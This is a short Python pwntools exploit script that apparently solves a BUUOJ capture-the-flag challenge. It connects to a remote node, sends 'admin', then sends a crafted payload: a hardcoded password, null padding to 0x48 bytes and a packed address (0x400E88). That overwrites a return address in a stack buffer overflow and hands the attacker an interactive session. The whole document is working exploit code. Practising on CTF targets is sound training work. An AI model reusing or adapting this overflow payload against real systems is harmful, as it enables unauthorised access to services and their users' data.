from pwn import *

sh=remote("node5.buuoj.cn",28036)
payload=b"2jctf_pa5sw0rd\x00"
payload=payload.ljust(0x48,b"\x00")
payload+=p64(0x0000000000400E88)

sh.sendline(b"admin")
sh.sendline(payload)
sh.interactive()
